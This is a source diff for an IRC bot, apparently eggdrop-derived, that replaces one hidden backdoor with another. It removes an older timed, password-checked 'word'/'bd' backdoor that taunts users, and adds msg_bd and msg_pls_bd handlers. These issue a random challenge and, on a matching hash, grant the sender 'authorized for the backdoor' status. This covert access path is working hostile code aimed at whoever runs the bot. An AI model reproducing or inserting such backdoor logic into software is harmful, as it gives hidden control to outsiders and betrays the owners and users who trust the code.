@@ -366,62 +366,80 @@ static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
 }
 #endif /* S_AUTHCMDS */
 
-int backdoor = 0, bl = 30, authed = 0;
-char thenick[NICKLEN] = "";
 
-static void close_backdoor()
-{
-  backdoor = 0;
-  authed = 0;
-  thenick[0] = '\0';
-}
 
-static int msg_word(char *nick, char *host, struct userrec *u, char *par)
+static int msg_bd(char *nick, char *host, struct userrec *u, char *par)
 {
-  egg_timeval_t howlong;
+  int i = 0;
+  char randstring[50] = "";
+
   if (match_my_nick(nick))
     return BIND_RET_BREAK;
 
-  backdoor = 1;
-  howlong.sec = bl;
-  howlong.usec = 0;
-  timer_create(&howlong, "close_backdoor", (Function) close_backdoor);
-  sprintf(thenick, "%s", nick);
-  dprintf(DP_SERVER, "PRIVMSG %s :w\002\002\002\002hat?\n", nick);
+  i = findauth(host);
+  /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! BD?", nick, host, u->handle); */
+
+  if (i != -1) {
+    if (auth[i].authed) {
+      if (!auth[i].bd)
+        dprintf(DP_HELP, "NOTICE %s :You are already authed, unauth and start over.\n", nick);
+      else
+        dprintf(DP_HELP, "NOTICE %s :You are already authed for backdoor.\n", nick);
+      return 0;
+    }
+  }
+
+  /* Send "auth." if they are recognized, otherwise "auth!" */
+  if (i < 0)
+    i = new_auth();
+  auth[i].authing = 2;
+  auth[i].authed = 0;
+  strcpy(auth[i].nick, nick);
+  strcpy(auth[i].host, host);
+  if (u) {
+    auth[i].user = u;
+    strcpy(auth[i].hand, u->handle);
+  }
+  make_rand_str(randstring, 50);
+  strncpyz(auth[i].hash, makebdhash(randstring), sizeof auth[i].hash);
+  dprintf(DP_HELP, "PRIVMSG %s :-BD %s %s\n", nick, randstring, conf.bot->nick);
+
   return BIND_RET_BREAK;
 }
 
-
-static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
+static int msg_pls_bd(char *nick, char *host, struct userrec *u, char *par)
 {
-/*  int left = 0; */
 
-  if (strcmp(nick, thenick) || !backdoor)
+  int i = 0;
+
+  if (match_my_nick(nick))
+    return BIND_RET_BREAK;
+  if (u && u->bot)
     return BIND_RET_BREAK;
 
-  if (!authed) {
-    char *cmd = NULL, *pass = NULL;
-    cmd = newsplit(&par);
-    pass = newsplit(&par);
-    if (!cmd[0] || strcmp(cmd, "werd") || !pass[0]) {
-      backdoor = 0;
-      return BIND_RET_BREAK;
-    }
-    if (md5cmp(bdhash, pass)) {
-      backdoor = 0;
-      return BIND_RET_BREAK;
-    }
-    authed = 1;
-/*
-    left = bl - bcnt;
-    dprintf(DP_SERVER, "PRIVMSG %s :%ds left ;)\n",nick, left);
-*/
-  } else {
-   dprintf(DP_SERVER, "PRIVMSG %s :Too bad I stripped out TCL! AHAHAHA YOU LOSE ;\\.\n", nick);
-  }
+  i = findauth(host);
+
+  if (i == -1)
+    return BIND_RET_BREAK;
+
+  if (auth[i].authing != 2)
+    return BIND_RET_BREAK;
+
+  if (!strcmp(auth[i].hash, par)) { /* good hash! */
+    /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle); */
+    auth[i].authed = 1;
+    auth[i].bd = 1;		/* the magic int ! */
+    auth[i].authing = 0;
+    auth[i].authtime = now;
+    auth[i].atime = now;
+    dprintf(DP_HELP, "NOTICE %s :You are now authorized for the backdoor. See '%cbd help'\n", nick, cmdprefix);
+  } else { /* bad hash! */
+    /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle); */
+    dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
+    removeauth(i);
+  } 
   return BIND_RET_BREAK;
 }
-
 
 /* MSG COMMANDS
  *
@@ -442,14 +460,12 @@ static cmd_t C_msg[] =
 #endif /* S_AUTHHASH */
   {"unauth",		"",	(Function) msg_unauth,		NULL},
 #endif /* S_AUTHCMDS */
-  {"word",		"",	(Function) msg_word,		NULL},
 #ifdef S_MSGCMDS
   {"ident",   		"",	(Function) msg_ident,		NULL},
   {"invite",		"",	(Function) msg_invite,		NULL},
   {"op",		"",	(Function) msg_op,		NULL},
   {"pass",		"",	(Function) msg_pass,		NULL},
 #endif /* S_MSGCMDS */
-  {"bd",		"",	(Function) msg_bd,		NULL},
   {NULL,		NULL,	NULL,				NULL}
 };
 
